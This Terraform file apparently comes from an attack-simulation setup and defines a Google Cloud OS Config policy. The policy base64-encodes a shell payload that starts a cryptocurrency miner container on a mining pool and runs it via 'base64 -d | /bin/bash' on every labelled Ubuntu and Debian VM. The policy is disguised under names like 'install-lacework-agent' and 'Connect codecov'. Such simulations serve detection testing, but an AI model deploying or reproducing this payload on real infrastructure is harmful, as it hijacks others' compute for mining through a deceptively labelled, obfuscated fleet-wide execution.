locals {
    # nicehash_name = var.nicehash_name
    # nicehash_image = var.nicehash_image
    # nicehash_server = var.nicehash_server
    # nicehash_user = var.nicehash_user
    minergate_name = var.minergate_name
    minergate_image = var.minergate_image
    minergate_server = var.minergate_server
    minergate_user=var.minergate_user

    payload = <<-EOT
    LOGFILE=/tmp/attacker_exec_docker_cpuminer.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    log "Checking for docker..."
    while ! which docker > /dev/null || ! docker ps > /dev/null; do
        log "docker not found or not ready - waiting"
        sleep 120
    done
    log "docker path: $(which docker)"
    if [[ `sudo docker ps | grep ${local.minergate_name}` ]]; then docker stop ${local.minergate_name}; fi
    sudo docker run --rm -d --network=host --name ${local.minergate_name} ${local.minergate_image} -a cryptonight -o ${local.minergate_server} -u ${ local.minergate_user } -p x
    sudo docker ps -a >> $LOGFILE 2>&1
    log "done"
    EOT
    base64_payload = base64encode(local.payload)
}

resource "google_os_config_os_policy_assignment" "install-lacework-agent" {

  project     = var.gcp_project_id
  location    = data.google_compute_zones.available.names[0]
  
  name        = "osconfig-connect-codecov-${var.environment}-${var.deployment}"
  description = "Connect codecov"
  skip_await_rollout = true
  
  instance_filter {
    all = false

    inclusion_labels {
      labels = var.label
    }

    inventories {
      os_short_name = "ubuntu"
    }

    inventories {
      os_short_name = "debian"
    }

  }

  os_policies {
    id   = "osconfig-connect-codecov-${var.environment}-${var.deployment}"
    mode = "ENFORCEMENT"

    resource_groups {
      resources {
        id = "run"
        exec {
          validate {
            interpreter      = "SHELL"
            output_file_path = "$HOME/os-policy-tf.out"
            script           = "if false; then exit 100; else exit 101; fi"
          }
          enforce {
            interpreter      = "SHELL"
            output_file_path = "$HOME/os-policy-tf.out"
            script           = "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash - && exit 100"
          }
        }
      }
    }
  }

  rollout {
    disruption_budget {
      percent = 100
    }
    min_wait_duration = "600s"
  }
}